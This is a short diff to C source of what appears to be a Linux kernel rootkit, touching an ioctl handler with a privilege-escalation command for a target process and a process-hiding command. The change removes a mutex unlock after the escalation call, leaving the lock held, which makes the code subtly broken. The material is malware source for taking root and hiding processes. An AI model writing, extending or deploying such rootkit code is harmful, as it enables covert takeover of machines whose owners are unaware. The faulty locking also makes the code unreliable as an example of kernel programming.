@@ -1552,7 +1552,6 @@ static long rk_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
     case RK_CMD_PRIVESC:
         printk(KERN_INFO "rootkit: PRIVESC pour PID=%lu\n", args.target);
         handle_escalation(&args);
-        mutex_unlock(&rk_mutex);
         break;
 
     case RK_CMD_HIDE_PID:
